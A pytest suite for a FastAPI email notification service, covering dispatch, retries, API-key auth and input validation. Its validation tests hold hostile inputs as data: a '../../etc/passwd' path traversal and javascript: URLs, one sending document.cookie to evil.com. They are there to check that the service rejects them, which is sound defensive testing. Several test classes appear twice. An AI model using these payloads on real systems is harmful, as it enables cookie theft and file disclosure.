"""
Testes para o sistema de notificacoes.

Execute com:
    pytest tests/ -v

Todos os testes usam SQLite em memoria e mocam o envio real de email.
Nenhuma credencial SMTP e necessaria.
"""
import json
from datetime import datetime, timedelta, timezone
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app.core.auth import verify_api_key
from app.core.database import Base, get_db
from app.main import app
from app.models import Notification, NotificationStatus, NotificationType
from app.services.notification_service import (
    ALLOWED_TEMPLATES,
    _MAX_ERROR_LENGTH,
    _dispatch_with_session,
    create_notification,
    get_or_create_recipient,
    reset_stale_sending,
    retry_pending_notifications,
)

# ── Banco SQLite em memoria ───────────────────────────────────────────────────
#
# StaticPool: forca todas as conexoes a reutilizar a MESMA conexao subjacente.
# Sem isso, cada novo checkout do pool cria um banco :memory: vazio separado,
# fazendo as tabelas "desaparecerem" entre a criacao (setup_db) e o uso
# durante o request (route handler via override_get_db).

SQLALCHEMY_DATABASE_URL = "sqlite:///:memory:"

engine = create_engine(
    SQLALCHEMY_DATABASE_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

# Chave usada em todos os testes de API
TEST_API_KEY = "test-key-that-is-long-enough-for-tests-32chars"
AUTH_HEADERS = {"X-API-Key": TEST_API_KEY}


@pytest.fixture(autouse=True)
def setup_db():
    Base.metadata.create_all(bind=engine)
    yield
    Base.metadata.drop_all(bind=engine)


@pytest.fixture()
def db():
    session = TestingSessionLocal()
    try:
        yield session
    finally:
        session.close()


@pytest.fixture()
def client(db):
    """
    Cliente de teste com SQLite em memoria, auth desabilitada e sem conexao PostgreSQL.

    dispatch_notification e mockado no nivel do router porque ele cria sua propria
    sessao via SessionLocal() (design correto para producao) que apontaria para
    PostgreSQL. Os testes de API testam a camada HTTP; o comportamento real do
    dispatch esta coberto em TestNotificationService via _dispatch_with_session.
    """
    def override_get_db():
        yield db

    def override_verify_api_key():
        return None

    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[verify_api_key] = override_verify_api_key

    with patch("app.main.start_scheduler"), \
         patch("app.main.stop_scheduler"), \
         patch("app.main.Base.metadata.create_all", side_effect=lambda **kw: None), \
         patch("app.api.notifications.dispatch_notification"):
        with TestClient(app) as c:
            yield c

    app.dependency_overrides.clear()


@pytest.fixture()
def auth_client(db):
    """
    Cliente de teste com autenticacao REAL ativa e API_KEY configurada.
    Usado nos testes de seguranca de autenticacao.

    get_settings e sobrescrito via dependency_overrides — o jeito correto em FastAPI.
    Patching do nome no modulo nao funciona porque Depends(get_settings) captura
    a referencia ao objeto funcao em tempo de definicao, nao de execucao.
    """
    from app.core.config import get_settings as real_get_settings

    def override_get_db():
        yield db

    class _MockSettings:
        """Substituto minimo de Settings com API_KEY configurada."""
        API_KEY = TEST_API_KEY
        APP_ENV = "development"
        RATE_LIMIT_PER_MINUTE = 9999  # sem limite nos testes

    app.dependency_overrides[get_db] = override_get_db
    app.dependency_overrides[real_get_settings] = lambda: _MockSettings()

    with patch("app.main.start_scheduler"), \
         patch("app.main.stop_scheduler"), \
         patch("app.main.Base.metadata.create_all", side_effect=lambda **kw: None), \
         patch("app.api.notifications.dispatch_notification"):
        with TestClient(app) as c:
            yield c

    app.dependency_overrides.clear()


# ── Testes unitarios — camada de servico ──────────────────────────────────────


class TestRecipientService:
    def test_create_recipient(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        assert r.id is not None
        assert r.email == "alice@example.com"

    def test_idempotent_get_or_create(self, db):
        r1 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        r2 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        assert r1.id == r2.id

    def test_distinct_recipients(self, db):
        r1 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        r2 = get_or_create_recipient(db, name="Bob", email="bob@example.com")
        assert r1.id != r2.id


class TestNotificationService:
    def test_create_notification(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.WELCOME,
            subject="Bem-vindo",
            template_context={"app_name": "TestApp"},
        )
        assert n.id is not None
        assert n.status == NotificationStatus.PENDING
        assert n.retry_count == 0
        assert json.loads(n.template_context)["app_name"] == "TestApp"

    def test_dispatch_success(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch("app.services.notification_service.send_email") as mock_send:
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.status == NotificationStatus.SENT
        assert n.sent_at is not None
        assert n.last_error is None
        mock_send.assert_called_once()

    def test_dispatch_failure_increments_retry(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception("SMTP error"),
        ):
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.retry_count == 1
        assert n.status == NotificationStatus.RETRYING
        assert "SMTP error" in n.last_error

    def test_last_error_is_truncated(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        long_error = "x" * 2000
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception(long_error),
        ):
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert len(n.last_error) <= _MAX_ERROR_LENGTH

    def test_dispatch_marks_failed_after_max_retries(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception("SMTP error"),
        ), patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_MAX_RETRIES = 1
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.status == NotificationStatus.FAILED

    def test_template_whitelist_blocks_unknown_template(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        n.template_name = "../../etc/passwd"
        db.commit()

        with patch("app.services.notification_service.send_email") as mock_send:
            _dispatch_with_session(db, n.id)

        mock_send.assert_not_called()
        db.refresh(n)
        assert n.status == NotificationStatus.RETRYING

    def test_allowed_templates_cover_all_template_map(self):
        from app.services.notification_service import TEMPLATE_MAP
        for t in TEMPLATE_MAP.values():
            assert t in ALLOWED_TEMPLATES, (
                f"{t} esta no TEMPLATE_MAP mas ausente de ALLOWED_TEMPLATES"
            )

    def test_retry_pending_notifications(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        for _ in range(3):
            create_notification(
                db,
                recipient_id=r.id,
                notification_type=NotificationType.GENERIC,
                subject="Batch",
            )
        with patch("app.services.notification_service.send_email"):
            with patch(
                "app.services.notification_service.dispatch_notification",
                side_effect=lambda nid: _dispatch_with_session(db, nid),
            ):
                count = retry_pending_notifications(db)

        assert count == 3

    def test_scheduled_notification_not_dispatched_early(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        future = datetime.now(timezone.utc) + timedelta(hours=2)
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Agendada",
            scheduled_at=future,
        )
        with patch("app.services.notification_service.send_email") as mock_send:
            with patch(
                "app.services.notification_service.dispatch_notification",
                side_effect=lambda nid: _dispatch_with_session(db, nid),
            ):
                retry_pending_notifications(db)

        mock_send.assert_not_called()
        db.refresh(n)
        assert n.status == NotificationStatus.PENDING

    def test_reset_stale_sending(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Stale",
        )
        n.status = NotificationStatus.SENDING
        n.updated_at = datetime.now(timezone.utc) - timedelta(seconds=600)
        db.commit()

        with patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_STALE_SENDING_SECONDS = 300
            count = reset_stale_sending(db)

        db.refresh(n)
        assert count == 1
        assert n.status == NotificationStatus.RETRYING

    def test_reset_stale_sending_ignores_recent(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Recent",
        )
        n.status = NotificationStatus.SENDING
        n.updated_at = datetime.now(timezone.utc) - timedelta(seconds=10)
        db.commit()

        with patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_STALE_SENDING_SECONDS = 300
            count = reset_stale_sending(db)

        db.refresh(n)
        assert count == 0
        assert n.status == NotificationStatus.SENDING


# ── Testes de seguranca — autenticacao ────────────────────────────────────────


class TestAuthentication:
    """
    Verifica que as rotas protegidas retornam 401/403 sem credenciais validas.
    Estes testes usam auth_client, que tem a autenticacao real ativa.
    """

    def test_missing_api_key_returns_401(self, auth_client):
        r = auth_client.get("/api/v1/notifications/")
        assert r.status_code == 401

    def test_wrong_api_key_returns_403(self, auth_client):
        r = auth_client.get(
            "/api/v1/notifications/",
            headers={"X-API-Key": "wrong-key"},
        )
        assert r.status_code == 403

    def test_correct_api_key_is_accepted(self, auth_client):
        r = auth_client.get(
            "/api/v1/notifications/",
            headers=AUTH_HEADERS,
        )
        assert r.status_code == 200

    def test_health_endpoint_is_public(self, auth_client):
        # /health nao requer autenticacao (usado por load balancers)
        r = auth_client.get("/health")
        assert r.status_code == 200

    def test_post_without_key_returns_401(self, auth_client):
        r = auth_client.post(
            "/api/v1/notifications/welcome",
            json={
                "recipient_email": "alice@example.com",
                "recipient_name": "Alice",
                "app_name": "App",
                "login_url": "https://app.example.com",
            },
        )
        assert r.status_code == 401


# ── Testes de seguranca — validacao de entrada ────────────────────────────────


class TestInputValidation:
    """Verifica que entradas maliciosas ou malformadas sao rejeitadas."""

    def test_javascript_url_rejected_in_login_url(self, client):
        r = client.post(
            "/api/v1/notifications/welcome",
            json={
                "recipient_email": "alice@example.com",
                "recipient_name": "Alice",
                "app_name": "App",
                "login_url": "javascript:alert(document.cookie)",
            },
        )
        assert r.status_code == 422

    def test_javascript_url_rejected_in_reset_url(self, client):
        r = client.post(
            "/api/v1/notifications/password-reset",
            json={
                "recipient_email": "alice@example.com",
                "recipient_name": "Alice",
                "reset_url": "javascript:fetch('https://evil.com?c='+document.cookie)",
                "expires_in_minutes": 30,
            },
        )
        assert r.status_code == 422

    def test_javascript_url_rejected_in_action_url(self, client):
        r = client.post(
            "/api/v1/notifications/alert",
            json={
                "recipient_email": "ops@example.com",
                "recipient_name": "Ops",
                "alert_title": "Teste",
                "alert_message": "Mensagem",
                "severity": "info",
                "action_url": "javascript:void(0)",
            },
        )
        assert r.status_code == 422

    def test_negative_amount_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/payment-confirmation",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "order_id": "ORD-001",
                "amount": -50.0,
                "currency": "BRL",
            },
        )
        assert r.status_code == 422

    def test_zero_amount_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/payment-confirmation",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "order_id": "ORD-001",
                "amount": 0.0,
                "currency": "BRL",
            },
        )
        assert r.status_code == 422

    def test_invalid_currency_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/payment-confirmation",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "order_id": "ORD-001",
                "amount": 100.0,
                "currency": "INVALID",
            },
        )
        assert r.status_code == 422

    def test_invalid_severity_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/alert",
            json={
                "recipient_email": "ops@example.com",
                "recipient_name": "Ops",
                "alert_title": "Teste",
                "alert_message": "Mensagem",
                "severity": "ultra-critical-xss<script>",
            },
        )
        assert r.status_code == 422

    def test_scheduled_at_in_past_rejected(self, client):
        past = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
        r = client.post(
            "/api/v1/notifications/",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "subject": "Teste",
                "notification_type": "generic",
                "scheduled_at": past,
            },
        )
        assert r.status_code == 422

    def test_scheduled_at_too_far_future_rejected(self, client):
        far_future = (datetime.now(timezone.utc) + timedelta(days=400)).isoformat()
        r = client.post(
            "/api/v1/notifications/",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "subject": "Teste",
                "notification_type": "generic",
                "scheduled_at": far_future,
            },
        )
        assert r.status_code == 422

    def test_subject_too_long_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "subject": "x" * 600,
                "notification_type": "generic",
            },
        )
        assert r.status_code == 422

    def test_too_many_items_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/payment-confirmation",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "order_id": "ORD-001",
                "amount": 100.0,
                "currency": "BRL",
                "items": [{"name": f"Item {i}", "price": 1.0} for i in range(60)],
            },
        )
        assert r.status_code == 422

    def test_template_context_too_many_keys_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/",
            json={
                "recipient_email": "user@example.com",
                "recipient_name": "User",
                "subject": "Teste",
                "notification_type": "generic",
                "template_context": {f"key_{i}": "value" for i in range(40)},
            },
        )
        assert r.status_code == 422

    def test_invalid_email_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/welcome",
            json={
                "recipient_email": "not-an-email",
                "recipient_name": "Alice",
                "app_name": "App",
                "login_url": "https://app.example.com",
            },
        )
        assert r.status_code == 422


# ── Testes de seguranca — campos sensiveis na resposta ────────────────────────


class TestResponseSecurity:
    """Garante que last_error nao aparece na resposta publica de listagem."""

    def test_last_error_absent_from_list_response(self, client):
        """
        last_error nunca deve aparecer em NotificationOut (resposta publica).
        So esta disponivel em NotificationAdminOut via GET /{id}.
        """
        with patch("app.services.notification_service.send_email"):
            client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "App",
                    "login_url": "https://app.example.com",
                },
            )
        r = client.get("/api/v1/notifications/")
        assert r.status_code == 200
        for item in r.json()["items"]:
            assert "last_error" not in item, (
                "last_error nao deve ser exposto na resposta de listagem"
            )

    def test_last_error_absent_from_post_response(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "App",
                    "login_url": "https://app.example.com",
                },
            )
        assert r.status_code == 202
        assert "last_error" not in r.json()

    def test_last_error_present_in_admin_detail_response(self, client, db):
        """
        GET /{id} usa NotificationAdminOut e deve incluir last_error
        (o endpoint exige API key, entao o caller e autenticado).
        """
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        n.last_error = "SMTP timeout"
        db.commit()

        resp = client.get(f"/api/v1/notifications/{n.id}")
        assert resp.status_code == 200
        assert "last_error" in resp.json()


# ── Testes de integracao — funcionalidade basica da API ───────────────────────


class TestNotificationsAPI:
    def test_health_check(self, client):
        r = client.get("/health")
        assert r.status_code == 200
        assert r.json()["status"] == "ok"

    def test_send_welcome(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "TestApp",
                    "login_url": "https://app.example.com",
                },
            )
        assert r.status_code == 202
        assert r.json()["notification_type"] == "welcome"

    def test_send_alert(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/alert",
                json={
                    "recipient_email": "ops@example.com",
                    "recipient_name": "Ops Team",
                    "alert_title": "CPU Alta",
                    "alert_message": "CPU acima de 90% por 5 minutos",
                    "severity": "critical",
                    "action_url": "https://dashboard.example.com",
                    "action_label": "Ver dashboard",
                },
            )
        assert r.status_code == 202
        assert r.json()["notification_type"] == "alert"

    def test_send_payment_confirmation(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/payment-confirmation",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "Joao",
                    "order_id": "ORD-001",
                    "amount": 199.90,
                    "currency": "BRL",
                    "items": [{"name": "Plano Pro", "price": 199.90}],
                },
            )
        assert r.status_code == 202

    def test_send_password_reset(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/password-reset",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "Joao",
                    "reset_url": "https://app.example.com/reset?token=abc123",
                    "expires_in_minutes": 30,
                },
            )
        assert r.status_code == 202

    def test_list_notifications(self, client):
        with patch("app.services.notification_service.send_email"):
            client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "App",
                    "login_url": "https://app.example.com",
                },
            )
        r = client.get("/api/v1/notifications/")
        assert r.status_code == 200
        body = r.json()
        assert body["total"] >= 1
        assert isinstance(body["items"], list)

    def test_list_notifications_filter_by_status(self, client):
        r = client.get("/api/v1/notifications/?status=pending")
        assert r.status_code == 200
        for item in r.json()["items"]:
            assert item["status"] == "pending"

    def test_get_notification_not_found(self, client):
        r = client.get("/api/v1/notifications/99999")
        assert r.status_code == 404

    def test_retry_non_failed_notification_returns_400(self, client):
        with patch("app.services.notification_service.send_email"):
            create_r = client.post(
                "/api/v1/notifications/",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "User",
                    "subject": "Teste",
                    "notification_type": "generic",
                },
            )
        nid = create_r.json()["id"]
        r = client.post(f"/api/v1/notifications/{nid}/retry")
        assert r.status_code == 400

    def test_pagination(self, client):
        with patch("app.services.notification_service.send_email"):
            for i in range(5):
                client.post(
                    "/api/v1/notifications/",
                    json={
                        "recipient_email": f"user{i}@example.com",
                        "recipient_name": f"User {i}",
                        "subject": f"Notificacao {i}",
                        "notification_type": "generic",
                    },
                )
        r = client.get("/api/v1/notifications/?limit=2&skip=0")
        assert r.status_code == 200
        body = r.json()
        assert len(body["items"]) <= 2
        assert body["total"] >= 5



# ── Testes unitarios — camada de servico ──────────────────────────────────────


class TestRecipientService:
    def test_create_recipient(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        assert r.id is not None
        assert r.email == "alice@example.com"

    def test_idempotent_get_or_create(self, db):
        r1 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        r2 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        assert r1.id == r2.id

    def test_distinct_recipients(self, db):
        r1 = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        r2 = get_or_create_recipient(db, name="Bob", email="bob@example.com")
        assert r1.id != r2.id


class TestNotificationService:
    def test_create_notification(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.WELCOME,
            subject="Bem-vindo",
            template_context={"app_name": "TestApp"},
        )
        assert n.id is not None
        assert n.status == NotificationStatus.PENDING
        assert n.retry_count == 0
        assert json.loads(n.template_context)["app_name"] == "TestApp"

    def test_dispatch_success(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch("app.services.notification_service.send_email") as mock_send:
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.status == NotificationStatus.SENT
        assert n.sent_at is not None
        assert n.last_error is None
        mock_send.assert_called_once()

    def test_dispatch_failure_increments_retry(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception("SMTP error"),
        ):
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.retry_count == 1
        assert n.status == NotificationStatus.RETRYING
        assert "SMTP error" in n.last_error

    def test_last_error_is_truncated(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        long_error = "x" * 2000
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception(long_error),
        ):
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert len(n.last_error) <= _MAX_ERROR_LENGTH

    def test_dispatch_marks_failed_after_max_retries(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        with patch(
            "app.services.notification_service.send_email",
            side_effect=Exception("SMTP error"),
        ), patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_MAX_RETRIES = 1
            _dispatch_with_session(db, n.id)

        db.refresh(n)
        assert n.status == NotificationStatus.FAILED

    def test_template_whitelist_blocks_unknown_template(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Teste",
        )
        # Corrompemos o template_name diretamente no banco
        n.template_name = "../../etc/passwd"
        db.commit()

        with patch("app.services.notification_service.send_email") as mock_send:
            _dispatch_with_session(db, n.id)

        mock_send.assert_not_called()
        db.refresh(n)
        assert n.status == NotificationStatus.RETRYING

    def test_allowed_templates_are_complete(self):
        """Garante que todos os templates no TEMPLATE_MAP estao na whitelist."""
        from app.services.notification_service import TEMPLATE_MAP
        for t in TEMPLATE_MAP.values():
            assert t in ALLOWED_TEMPLATES, f"{t} esta no TEMPLATE_MAP mas nao em ALLOWED_TEMPLATES"

    def test_retry_pending_notifications(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        for _ in range(3):
            create_notification(
                db,
                recipient_id=r.id,
                notification_type=NotificationType.GENERIC,
                subject="Batch",
            )
        with patch("app.services.notification_service.send_email"):
            # retry_pending_notifications chama dispatch_notification que abre sua propria sessao;
            # aqui usamos _dispatch_with_session para manter os testes isolados no SQLite.
            with patch(
                "app.services.notification_service.dispatch_notification",
                side_effect=lambda nid: _dispatch_with_session(db, nid),
            ):
                count = retry_pending_notifications(db)

        assert count == 3

    def test_scheduled_notification_not_dispatched_early(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        future = datetime.now(timezone.utc) + timedelta(hours=2)
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Agendada",
            scheduled_at=future,
        )
        with patch("app.services.notification_service.send_email") as mock_send:
            with patch(
                "app.services.notification_service.dispatch_notification",
                side_effect=lambda nid: _dispatch_with_session(db, nid),
            ):
                retry_pending_notifications(db)

        mock_send.assert_not_called()
        db.refresh(n)
        assert n.status == NotificationStatus.PENDING

    def test_reset_stale_sending(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Stale",
        )
        # Simula notificacao travada em SENDING com updated_at no passado
        n.status = NotificationStatus.SENDING
        n.updated_at = datetime.now(timezone.utc) - timedelta(seconds=600)
        db.commit()

        with patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_STALE_SENDING_SECONDS = 300
            count = reset_stale_sending(db)

        db.refresh(n)
        assert count == 1
        assert n.status == NotificationStatus.RETRYING

    def test_reset_stale_sending_ignores_recent(self, db):
        r = get_or_create_recipient(db, name="Alice", email="alice@example.com")
        n = create_notification(
            db,
            recipient_id=r.id,
            notification_type=NotificationType.GENERIC,
            subject="Recent",
        )
        n.status = NotificationStatus.SENDING
        # updated_at recente — nao deve ser resetado
        n.updated_at = datetime.now(timezone.utc) - timedelta(seconds=10)
        db.commit()

        with patch("app.services.notification_service.settings") as mock_settings:
            mock_settings.SCHEDULER_STALE_SENDING_SECONDS = 300
            count = reset_stale_sending(db)

        db.refresh(n)
        assert count == 0
        assert n.status == NotificationStatus.SENDING


# ── Testes de integracao — API ────────────────────────────────────────────────


class TestNotificationsAPI:
    def test_health_check(self, client):
        r = client.get("/health")
        assert r.status_code == 200
        assert r.json()["status"] == "ok"

    def test_send_welcome(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "TestApp",
                    "login_url": "https://app.example.com",
                },
            )
        assert r.status_code == 202
        assert r.json()["notification_type"] == "welcome"

    def test_send_alert(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/alert",
                json={
                    "recipient_email": "ops@example.com",
                    "recipient_name": "Ops Team",
                    "alert_title": "CPU Alta",
                    "alert_message": "CPU acima de 90% por 5 minutos",
                    "severity": "critical",
                    "action_url": "https://dashboard.example.com",
                    "action_label": "Ver dashboard",
                },
            )
        assert r.status_code == 202
        assert r.json()["notification_type"] == "alert"

    def test_send_payment_confirmation(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/payment-confirmation",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "Joao",
                    "order_id": "ORD-001",
                    "amount": 199.90,
                    "currency": "BRL",
                    "items": [{"name": "Plano Pro", "price": 199.90}],
                },
            )
        assert r.status_code == 202

    def test_send_password_reset(self, client):
        with patch("app.services.notification_service.send_email"):
            r = client.post(
                "/api/v1/notifications/password-reset",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "Joao",
                    "reset_url": "https://app.example.com/reset?token=abc123",
                    "expires_in_minutes": 30,
                },
            )
        assert r.status_code == 202

    def test_list_notifications(self, client):
        with patch("app.services.notification_service.send_email"):
            client.post(
                "/api/v1/notifications/welcome",
                json={
                    "recipient_email": "alice@example.com",
                    "recipient_name": "Alice",
                    "app_name": "App",
                    "login_url": "https://app.example.com",
                },
            )
        r = client.get("/api/v1/notifications/")
        assert r.status_code == 200
        body = r.json()
        assert body["total"] >= 1
        assert isinstance(body["items"], list)

    def test_list_notifications_filter_by_status(self, client):
        r = client.get("/api/v1/notifications/?status=pending")
        assert r.status_code == 200
        for item in r.json()["items"]:
            assert item["status"] == "pending"

    def test_get_notification_not_found(self, client):
        r = client.get("/api/v1/notifications/99999")
        assert r.status_code == 404

    def test_retry_non_failed_notification_returns_400(self, client):
        with patch("app.services.notification_service.send_email"):
            create_r = client.post(
                "/api/v1/notifications/",
                json={
                    "recipient_email": "user@example.com",
                    "recipient_name": "User",
                    "subject": "Teste",
                    "notification_type": "generic",
                },
            )
        nid = create_r.json()["id"]
        # Notificacoes SENT nao podem ser reenviadas
        r = client.post(f"/api/v1/notifications/{nid}/retry")
        assert r.status_code == 400

    def test_pagination(self, client):
        with patch("app.services.notification_service.send_email"):
            for i in range(5):
                client.post(
                    "/api/v1/notifications/",
                    json={
                        "recipient_email": f"user{i}@example.com",
                        "recipient_name": f"User {i}",
                        "subject": f"Notificacao {i}",
                        "notification_type": "generic",
                    },
                )
        r = client.get("/api/v1/notifications/?limit=2&skip=0")
        assert r.status_code == 200
        body = r.json()
        assert len(body["items"]) <= 2
        assert body["total"] >= 5

    def test_invalid_severity_rejected(self, client):
        r = client.post(
            "/api/v1/notifications/alert",
            json={
                "recipient_email": "ops@example.com",
                "recipient_name": "Ops",
                "alert_title": "Teste",
                "alert_message": "Mensagem",
                "severity": "invalid_severity",
            },
        )
        assert r.status_code == 422
